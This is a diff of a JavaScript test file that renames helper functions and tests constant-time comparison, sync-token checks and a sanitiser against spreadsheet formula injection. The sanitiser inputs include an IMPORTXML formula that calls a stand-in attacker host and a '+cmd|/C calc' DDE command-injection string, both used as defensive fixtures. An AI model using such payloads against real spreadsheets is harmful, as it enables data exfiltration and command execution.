@@ -19,22 +19,22 @@ const context = {
   }
 };
 vm.createContext(context);
-vm.runInContext(['constantTimeEquals', 'safeSheetValue', 'requireSyncToken'].map(extract).join('\n'), context);
+vm.runInContext(['constantTimeEquals_', 'safeSheetValue_', 'requireSyncToken_'].map(extract).join('\n'), context);
 
-assert.equal(context.constantTimeEquals('secret', 'secret'), true);
-assert.equal(context.constantTimeEquals('secret', 'secreu'), false);
-assert.equal(context.constantTimeEquals('secret', 'secret-long'), false);
+assert.equal(context.constantTimeEquals_('secret', 'secret'), true);
+assert.equal(context.constantTimeEquals_('secret', 'secreu'), false);
+assert.equal(context.constantTimeEquals_('secret', 'secret-long'), false);
 
 for (const input of ['=IMPORTXML("https://attacker.invalid","//x")', '   =1+1', '+cmd|/C calc', '-1+1', '@SUM(A1:A2)']) {
-  assert.equal(context.safeSheetValue(input), "'" + input, 'formula-like text must be neutralized');
+  assert.equal(context.safeSheetValue_(input), "'" + input, 'formula-like text must be neutralized');
 }
-assert.equal(context.safeSheetValue('ordinary product'), 'ordinary product');
-assert.equal(context.safeSheetValue(-125.5), -125.5, 'numeric negatives remain numeric');
+assert.equal(context.safeSheetValue_('ordinary product'), 'ordinary product');
+assert.equal(context.safeSheetValue_(-125.5), -125.5, 'numeric negatives remain numeric');
 
-assert.throws(() => context.requireSyncToken('wrong'), /Unauthorized/);
-assert.doesNotThrow(() => context.requireSyncToken(configuredToken));
+assert.throws(() => context.requireSyncToken_('wrong'), /Unauthorized/);
+assert.doesNotThrow(() => context.requireSyncToken_(configuredToken));
 configuredToken = '';
-assert.throws(() => context.requireSyncToken('anything'), /not configured securely/);
+assert.throws(() => context.requireSyncToken_('anything'), /not configured securely/);
 
 const doPostStart = source.indexOf('function doPost(e)');
 const doPostEnd = source.indexOf('\nfunction storeReceipt_', doPostStart);
